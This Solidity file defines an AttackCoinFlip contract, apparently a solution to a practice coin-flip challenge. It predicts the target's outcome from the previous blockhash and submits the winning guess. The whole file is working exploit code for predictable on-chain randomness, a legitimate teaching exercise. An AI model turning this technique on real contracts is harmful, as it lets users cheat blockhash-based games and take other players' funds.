// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ICoinFlip.sol";

contract AttackCoinFlip {

    ICoinFlip coinFlip;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(ICoinFlip _coinFlip) {
        coinFlip = _coinFlip;
    }

    function flip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        lastHash = blockValue;
        uint256 cFlip = blockValue / FACTOR;
        bool side = cFlip == 1 ? true : false;
        coinFlip.flip(side);
    }
}
